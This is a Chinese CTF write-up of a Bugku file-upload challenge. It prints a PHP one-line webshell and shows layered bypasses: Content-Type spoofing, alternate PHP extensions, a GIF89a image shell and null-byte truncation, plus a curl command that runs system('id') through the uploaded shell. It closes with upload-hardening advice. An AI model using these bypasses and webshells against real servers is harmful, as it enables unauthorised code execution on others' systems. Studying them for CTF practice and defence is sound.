Bugku 求getshell：上传绕过的一整套组合拳

2026-10-31 · 约 10 分钟 · Bugku CTF

这题不是「改个后缀」就完事。它同时拦了后缀、类型和内容，只能一层一层试，把它们逐个击破 —— 也第一次让我把上传绕过的套路串成了清单。

题目信息

平台Bugku CTF
类型Web / 文件上传
知识点Content-Type、后缀黑名单、图片马、解析配置

先传一个 php 上去

页面是个上传框，旁边提示「只能上传图片」。我先随手传了一个 shell.php，内容是一句话木马：

<?php @eval($_POST['cmd']); ?>

回显是「文件类型不正确」。说明服务端有校验，而且大概率在看 Content-Type 或者后缀。先抓包，把请求里能改的地方都列出来：文件名、Content-Type、文件内容。上传题的所有绕过，本质上就是在这三个位置上做文章。

顺便说，报错的文案本身就是情报。「文件类型不正确」说明它先看类型，「文件后缀不允许」说明类型过了、还有后缀检查。两句话的先后，就是后端校验的先后 —— 按这个顺序去绕，比乱试快得多。

第一层：改 Content-Type

浏览器是根据后缀猜 Content-Type 的，但请求里的这个头由我们自己说了算。把它改成 image/png：

Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

如果后端只做 $_FILES['file']['type'] 的判断，这一改就过了。但这题没那么简单 —— 改完之后提示变成「文件后缀不允许」，说明还有一层后缀黑名单。两层的报错文案不一样，正好帮我确认了顺序。

第二层：换一个能解析的后缀

Apache 的 mod_php 认的不只是 .php。配置里如果有 AddType 或 AddHandler，.php5、.phtml、.pht、.phar 也可能被交给 PHP 解析。而黑名单往往只写了 .php：

shell.php5
shell.phtml
shell.pht

逐个试，看哪个能传上去并且真的被执行。注意：能不能执行取决于服务器配置，不是所有环境都认这些后缀，所以这里必须实际访问验证，不能想当然。

第三层：文件头与图片马

如果还有内容检测（getimagesize 或者 exif_imagetype），就在文件开头加图片魔数，让它在检查时是「合法图片」，在 PHP 解析时仍然是代码：

GIF89a
<?php @eval($_POST['cmd']); ?>

GIF89a 只有 6 个字节，不影响后面的 PHP 标签被解析。用 copy /b 或者直接用文本拼接都行。传上去之后可以直接 POST 过去验证：

curl -X POST "http://靶机/upload/shell.phtml" --data "cmd=system('id');"

第四层：路径与截断（看版本）

有些老题保存时会拼后缀，比如 $name = 原名 . ".jpg"，这时可以试 %00 截断（PHP 5.3.4 之前、且 magic_quotes_gpc 关闭）、双写后缀（.pphphp 被过滤一次后变 .php）、或者大小写 .PHP 绕过黑名单。这几种都要先确认 PHP 版本和过滤逻辑，盲试很容易白忙一场。这题我试到第三层就够了，截断只是记进笔记。

上传之后：找到能执行的路径

传成功不等于能执行。要确认三件事：文件落在哪个目录（看回显路径或常见 uploads）、该目录是否允许脚本执行、访问时是不是被当成静态文件下载。这题的回显直接给了地址，访问一下就看到命令输出。如果回显不给路径，就得靠目录扫描和报错去猜。

另外，能执行之后别急着翻大件。先用 whoami、id、ls 确认权限和位置，再决定下一步；练习环境里点到为止，别真去动系统文件。

复盘：三个白忙的坑

  • 只改了 filename 的后缀，没改 Content-Type，一直卡在第一层；
  • 用 .php5 传上去却打不开，因为那台机器只配了 .php 的 handler，换 .phtml 才行；
  • 图片马传成功了，但访问时被当成图片下载 —— 目录不允许执行，这种情况只能换思路。

上传题最忌讳「改一个地方、又不记录结果」。我后来固定用一张表：改了什么、返回什么、下一步试什么，三次之内基本能定位到卡在哪一层。

防御：上传目录不该能解析

  • 最有效的一条不是过滤后缀，而是让上传目录根本不执行脚本：Nginx 的 location 只允许静态，Apache 里 php_admin_flag engine off；
  • 后缀白名单 + 服务端重命名，不信任用户给的文件名；
  • 校验真实图片（重新编码），而不是只看前几个字节；
  • 文件存到 Web 根目录之外，下载走统一的出口脚本。

黑名单永远会漏 —— 漏一个不常见的可解析后缀就够了。白名单加「不解析」才是能落地的组合。
